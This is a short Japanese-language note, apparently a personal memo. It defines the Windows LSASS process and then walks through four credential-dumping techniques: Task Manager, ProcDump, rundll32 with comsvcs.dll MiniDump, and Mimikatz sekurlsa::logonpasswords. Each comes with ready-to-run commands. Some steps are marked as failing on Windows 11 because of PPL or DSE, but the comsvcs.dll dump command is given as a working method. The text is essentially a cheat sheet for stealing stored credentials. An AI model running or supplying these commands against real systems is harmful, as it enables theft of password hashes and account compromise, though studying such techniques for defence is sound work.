# Lsassとは
Local Security Authority Subsystem Serviceの略。  
Windows OSの重要なセキュリティプロセスで、ユーザー認証、セキュリティポリシーの適用、クレデンシャルの管理（パスワードハッシュなど）を担う。

# Lsassダンプとは
Lsassメモリの内容をダンプすることで、攻撃者がユーザー名やパスワードを盗み出す攻撃手法。  
Windows11ではPPL(Protected Process Light)が有効なため、できないことが多い。

## Step1 タスクマネージャー
※アクセス拒否で不可。
1. 管理者権限でタスクマネージャーを開く
2. 詳細タブから`lsass.exe`を探す
3. 右クリックでダンプファイルの作成

## Step2 Procdump
Sysinternalsのツール。Windows11の`lsass.exe`はPPLで保護されているため不可。
```powershell
procdump.exe -ma 908 lsass.dmp
```
## Step3 comsvcs.dll
Windowsに最初からある`rundll32.exe`と`comsvcs.dll`の悪用。
```powershell
Get-Process lsass # id 908
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 908 C:\Users\user\Desktop\lsass.dmp full
```
## Step4 Mimikatz
DSEによってカーネルドライバのロードができない可能性が高いため、`mimikatz.exe`が実行できたとしても不可。
```powershell
mimikatz.exe
privilege::debug
!+ # mimisrv.sysというカーネルドライバのロード
sekurlsa::logonpasswords
```
